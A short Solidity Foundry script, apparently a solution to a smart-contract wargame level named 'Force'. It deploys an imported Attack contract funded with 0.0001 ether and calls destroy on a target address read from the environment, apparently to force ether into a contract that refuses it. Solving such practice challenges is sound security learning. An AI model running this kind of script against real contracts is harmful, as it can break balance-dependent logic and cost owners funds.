// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() external {
        address targetAddress = vm.envAddress("FORCE_INSTANCE");

        vm.startBroadcast();
        Attack attacker = new Attack{value: 0.0001 ether}();
        attacker.destroy(payable(targetAddress));
        vm.stopBroadcast();

        console.log("Attack contract deployed at:", address(attacker));
    }
}
